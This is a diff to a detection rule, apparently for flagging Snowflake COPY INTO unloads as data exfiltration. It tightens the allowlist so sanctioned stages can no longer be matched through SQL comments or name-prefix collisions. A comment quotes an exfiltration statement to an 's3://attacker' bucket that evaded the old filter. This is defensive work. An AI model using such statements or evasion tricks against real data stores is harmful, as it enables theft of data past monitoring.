@@ -51,10 +51,13 @@ detection:
     # here was satisfied by the stage name in a SQL comment, so
     # `COPY INTO 's3://attacker/x' FROM t /* MY_SANCTIONED_STAGE */` passed as sanctioned.
     # Write each entry as the statement starts, e.g. `COPY INTO 's3://sanctioned-bucket/`,
-    # and END it with the path separator: without it, `@MY_SANCTIONED_STAGE` also exempts
-    # `@MY_SANCTIONED_STAGE_EVIL`.
+    # and END it with a delimiter: without one, `@MY_SANCTIONED_STAGE` also exempts
+    # `@MY_SANCTIONED_STAGE_EVIL`. A stage takes TWO entries - the path form (`@STAGE/`)
+    # and the stage-root form (`@STAGE ` with a trailing space, as in
+    # `COPY INTO @STAGE FROM t`) - plus a newline form if your SQL breaks the line there.
     query_text|startswith:
       - 'COPY INTO @MY_SANCTIONED_STAGE/'   # example — replace with your known-good stages
+      - 'COPY INTO @MY_SANCTIONED_STAGE '   # example — the same stage, unloaded to its root
   condition: selection_unload and not 1 of filter_*
 falsepositives:
   - Unloads to a named INTERNAL stage (not `@%`/`@~`) - indistinguishable from external
